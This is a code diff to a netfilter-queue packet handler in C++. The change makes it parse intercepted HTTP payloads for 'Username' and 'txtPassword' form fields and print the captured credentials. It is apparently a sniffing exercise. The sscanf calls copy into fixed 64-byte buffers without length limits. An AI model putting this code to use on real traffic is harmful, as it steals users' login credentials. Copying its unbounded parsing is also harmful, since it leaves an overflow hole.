@@ -90,11 +90,23 @@ void FilterOperator::set_timeout(int sec, int usec)
 }
 
 void extractHttpInfo(const unsigned char* payload, int payloadSize) {
-    const char* httpHeaderStart = strstr((const char*)payload, "HTTP/");
+    const char *httpHeaderStart = strstr((const char*)payload, "HTTP/");
+    const char *ptr;
+
+    char username[64];
+    char password[64];
+
+    // std::cout << payload << std::endl;
     if (httpHeaderStart) {
         // HTTP header found, print it
-        std::cout << "HTTP Header:" << std::endl;
-        std::cout.write((const char*)httpHeaderStart, payloadSize - (httpHeaderStart - (const char*)payload));
+        // std::cout << "HTTP Header:" << std::endl;
+        // std::cout.write((const char*)httpHeaderStart, payloadSize - (httpHeaderStart - (const char*)payload));
+        // Username=12341234&txtPassword=password
+        if ((ptr = strstr(httpHeaderStart, "Username")) != NULL) {
+            sscanf(ptr, "Username=%[^&]&txtPassword=%s", username, password);
+            std::cout << "Username: " << username << std::endl;
+            std::cout << "Password: " << password << std::endl;
+        }
     }
 }
 
@@ -121,10 +133,9 @@ static int callback(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
 
     int payload_len = ret - ip_header_len - tcp_header_len;
 
-    if (ret >= 0) {
+    if (payload_len >= 0) {
         extractHttpInfo(payload, payload_len);
-        return NF_ACCEPT;
     }
 
-    return NF_ACCEPT;
+    return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
 }
